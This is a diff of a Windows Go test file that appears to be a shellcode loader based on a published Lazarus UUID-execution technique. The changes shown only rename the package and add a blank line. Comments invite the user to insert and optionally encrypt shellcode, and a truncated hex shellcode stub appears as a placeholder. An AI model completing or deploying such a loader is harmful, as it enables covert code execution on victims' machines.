@@ -1,7 +1,7 @@
 //go:build windows
 // +build windows
 
-package other
+package other_test_test
 
 //大佬gist嫖来的代码，记录一下：https://gist.github.com/ramoncjs3/a801bbb9d845102063115fb9d59b622d
 // Concept pulled from https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
@@ -36,6 +36,7 @@ import (
 func Test_uuid(t *testing.T) {
 	// 在这填shellcode,也可以再加密啥的
 	shellcode, err := hex.DecodeString("fc4883e4f0e8c8000000415141505251564831d···shellcode")
+
 	if err != nil {
 		return
 	}
